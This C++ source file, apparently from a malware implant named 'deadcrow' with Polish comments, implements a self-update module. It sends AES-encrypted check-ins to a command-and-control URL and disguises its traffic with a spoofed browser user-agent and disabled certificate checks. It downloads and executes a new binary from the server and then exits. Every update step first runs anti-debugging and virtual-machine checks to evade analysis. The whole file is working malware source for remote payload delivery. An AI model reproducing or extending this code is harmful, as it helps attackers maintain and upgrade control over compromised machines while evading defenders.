#include "upgrade.h"
#include "../utils/anti_debug.h"
#include "../utils/aes.h"
#include <iostream>
#include <fstream>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <random>
#include <sstream>
#include <regex>

using json = nlohmann::json;

namespace deadcrow {
namespace core {

// Callback dla libcurl do zapisywania danych
size_t UpgradeWriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    std::string* response = static_cast<std::string*>(userp);
    response->append(static_cast<char*>(contents), realsize);
    return realsize;
}

// Callback dla libcurl do zapisywania danych do pliku
size_t UpgradeWriteToFileCallback(void* ptr, size_t size, size_t nmemb, FILE* stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

Upgrade::Upgrade(const std::string& c2_url, const std::string& aes_key)
    : c2_url_(c2_url), aes_key_(aes_key) {
    
    // Inicjalizacja libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[UPGRADE] " << status << std::endl;
        #endif
    };
}

bool Upgrade::checkForUpdate(const std::string& current_version) {
    reportStatus("Sprawdzanie dostępności aktualizacji. Aktualna wersja: " + current_version);
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Przygotuj dane do wysłania
    json data;
    data["current_version"] = current_version;
    data["timestamp"] = std::chrono::system_clock::now().time_since_epoch().count();
    
    // Dodaj losowy identyfikator żądania, aby uniknąć cachowania
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1, 1000000);
    data["request_id"] = dis(gen);
    
    // Wyślij żądanie do C2
    std::string response = sendRequest("check_update", data.dump());
    
    // Parsuj odpowiedź
    if (!response.empty()) {
        return parseResponse(response);
    }
    
    return false;
}

bool Upgrade::downloadAndInstallUpdate(const std::string& current_version, const std::string& executable_path) {
    reportStatus("Pobieranie i instalacja aktualizacji");
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Sprawdź, czy mamy informacje o najnowszej wersji
    if (latest_version_.empty() || latest_version_url_.empty()) {
        if (!checkForUpdate(current_version)) {
            reportStatus("Nie udało się pobrać informacji o aktualizacji");
            return false;
        }
    }
    
    // Sprawdź, czy aktualizacja jest dostępna
    if (!isNewerVersion(current_version, latest_version_)) {
        reportStatus("Brak dostępnych aktualizacji");
        return false;
    }
    
    // Generuj losową nazwę pliku tymczasowego
    std::string temp_path = std::tmpnam(nullptr);
    temp_path += ".exe";
    
    // Pobierz plik
    if (!downloadFile(latest_version_url_, temp_path)) {
        reportStatus("Nie udało się pobrać aktualizacji");
        return false;
    }
    
    reportStatus("Aktualizacja pobrana. Instalacja...");
    
    // Wykonaj plik aktualizacji
    if (!executeFile(temp_path)) {
        reportStatus("Nie udało się uruchomić aktualizacji");
        std::remove(temp_path.c_str());
        return false;
    }
    
    // Zakończ bieżący proces
    reportStatus("Aktualizacja uruchomiona. Kończenie bieżącego procesu.");
    
    // Usuń plik tymczasowy (w produkcji lepiej to zrobić w nowej wersji)
    std::remove(temp_path.c_str());
    
    // Zakończ proces
#ifdef _WIN32
    ExitProcess(0);
#else
    exit(0);
#endif
    
    return true;
}

std::string Upgrade::sendRequest(const std::string& endpoint, const std::string& data) {
    try {
        // Szyfruj dane
        utils::AES aes(aes_key_);
        std::string encrypted_data = aes.encryptToBase64(data);
        
        // Przygotuj URL
        std::string url = c2_url_;
        if (url.back() != '/') {
            url += '/';
        }
        url += endpoint;
        
        // Inicjalizuj sesję CURL
        CURL* curl = curl_easy_init();
        if (!curl) {
            reportStatus("Nie udało się zainicjalizować libcurl");
            return "";
        }
        
        // Przygotuj odpowiedź
        std::string response;
        
        // Przygotuj nagłówki
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
        
        // Przygotuj dane POST
        json post_data;
        post_data["data"] = encrypted_data;
        std::string post_fields = post_data.dump();
        
        // Konfiguracja żądania
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, UpgradeWriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Wyłącz weryfikację SSL (w produkcji lepiej włączyć)
        
        // Wykonaj żądanie
        CURLcode res = curl_easy_perform(curl);
        
        // Zwolnij zasoby
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        
        if (res != CURLE_OK) {
            reportStatus("Błąd podczas wysyłania żądania: " + std::string(curl_easy_strerror(res)));
            return "";
        }
        
        return response;
    }
    catch (const std::exception& e) {
        reportStatus("Wyjątek podczas wysyłania żądania: " + std::string(e.what()));
        return "";
    }
}

bool Upgrade::parseResponse(const std::string& response) {
    try {
        // Deszyfruj odpowiedź
        utils::AES aes(aes_key_);
        
        // Parsuj JSON
        json response_json = json::parse(response);
        
        // Sprawdź, czy odpowiedź zawiera zaszyfrowane dane
        if (!response_json.contains("data")) {
            reportStatus("Odpowiedź nie zawiera danych");
            return false;
        }
        
        // Deszyfruj dane
        std::string encrypted_data = response_json["data"];
        std::string decrypted_data = aes.decryptFromBase64(encrypted_data);
        
        // Parsuj odszyfrowane dane
        json result = json::parse(decrypted_data);
        
        // Sprawdź, czy odpowiedź zawiera informacje o aktualizacji
        if (result.contains("latest_version") && result.contains("download_url")) {
            latest_version_ = result["latest_version"];
            latest_version_url_ = result["download_url"];
            
            reportStatus("Pobrano informacje o aktualizacji. Najnowsza wersja: " + latest_version_);
            return true;
        } else {
            reportStatus("Odpowiedź nie zawiera informacji o aktualizacji");
            return false;
        }
    }
    catch (const std::exception& e) {
        reportStatus("Błąd podczas parsowania odpowiedzi: " + std::string(e.what()));
        return false;
    }
}

bool Upgrade::downloadFile(const std::string& url, const std::string& output_path) {
    reportStatus("Pobieranie pliku z URL: " + url + " do: " + output_path);
    
    // Inicjalizuj sesję CURL
    CURL* curl = curl_easy_init();
    if (!curl) {
        reportStatus("Nie udało się zainicjalizować libcurl");
        return false;
    }
    
    // Otwórz plik do zapisu
    FILE* fp = fopen(output_path.c_str(), "wb");
    if (!fp) {
        reportStatus("Nie udało się otworzyć pliku do zapisu");
        curl_easy_cleanup(curl);
        return false;
    }
    
    // Konfiguracja żądania
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, UpgradeWriteToFileCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Wyłącz weryfikację SSL (w produkcji lepiej włączyć)
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
    
    // Wykonaj żądanie
    CURLcode res = curl_easy_perform(curl);
    
    // Zamknij plik
    fclose(fp);
    
    // Zwolnij zasoby
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        reportStatus("Błąd podczas pobierania pliku: " + std::string(curl_easy_strerror(res)));
        return false;
    }
    
    reportStatus("Plik pobrany pomyślnie");
    return true;
}

bool Upgrade::executeFile(const std::string& path) {
    reportStatus("Wykonywanie pliku: " + path);
    
#ifdef _WIN32
    // Windows
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Utwórz proces
    if (!CreateProcessA(path.c_str(), NULL, NULL, NULL, FALSE, 
                      0, NULL, NULL, &si, &pi)) {
        reportStatus("Nie udało się utworzyć procesu");
        return false;
    }
    
    // Zwolnij uchwyty
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return true;
#else
    // Linux
    // Nadaj uprawnienia do wykonania
    std::string chmod_command = "chmod +x \"" + path + "\"";
    system(chmod_command.c_str());
    
    // Wykonaj plik w tle
    std::string command = "\"" + path + "\" &";
    system(command.c_str());
    
    return true;
#endif
}

bool Upgrade::isNewerVersion(const std::string& current_version, const std::string& new_version) {
    // Funkcja porównująca wersje w formacie x.y.z
    std::regex version_regex("(\\d+)\\.(\\d+)\\.(\\d+)");
    std::smatch current_match, new_match;
    
    if (!std::regex_match(current_version, current_match, version_regex) ||
        !std::regex_match(new_version, new_match, version_regex)) {
        reportStatus("Nieprawidłowy format wersji");
        return false;
    }
    
    // Porównaj wersje
    int current_major = std::stoi(current_match[1]);
    int current_minor = std::stoi(current_match[2]);
    int current_patch = std::stoi(current_match[3]);
    
    int new_major = std::stoi(new_match[1]);
    int new_minor = std::stoi(new_match[2]);
    int new_patch = std::stoi(new_match[3]);
    
    if (new_major > current_major) {
        return true;
    } else if (new_major == current_major) {
        if (new_minor > current_minor) {
            return true;
        } else if (new_minor == current_minor) {
            return new_patch > current_patch;
        }
    }
    
    return false;
}

std::string Upgrade::getLatestVersion() {
    return latest_version_;
}

std::string Upgrade::getLatestVersionUrl() {
    return latest_version_url_;
}

void Upgrade::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void Upgrade::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

bool Upgrade::checkForDebugging() {
    return utils::AntiDebug::performAllChecks();
}

} // namespace core
} // namespace deadcrow
